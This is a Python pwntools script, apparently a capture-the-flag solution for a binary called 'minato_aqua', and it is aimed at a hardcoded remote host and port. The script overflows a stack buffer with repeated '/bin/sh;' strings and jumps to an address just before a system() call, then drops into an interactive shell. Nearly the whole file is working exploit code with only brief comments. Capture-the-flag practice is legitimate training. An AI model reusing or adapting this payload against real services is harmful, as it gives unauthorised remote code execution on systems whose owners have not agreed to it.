from pwn import *

# nc 167.172.88.66 8001
HOST='167.172.88.66'
PORT=8001

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level='warn')
    p.sendlineafter(b'>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify GDB script here (breakpoints etc)
gdbscript = '''
b *0x4011de
b *0x4011bf
b *0x4011d3
'''.format(**locals())

# Binary filename
exe = './minato_aqua'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
# libc.address = elf.sym['system'] - libc.sym['system']

io = start()

# Pass in pattern_size, get back EIP/RIP offset
binsh = b"/bin/sh;"
offset = 40 - len(binsh)
main = 0x401212
system_func = 0x4011bf
before_call_system = 0x4011d3


payload = binsh * 5 + p64(before_call_system)

# Send the payload
io.sendlineafter(b'Input: ', payload)

# Got Shell?
io.interactive()
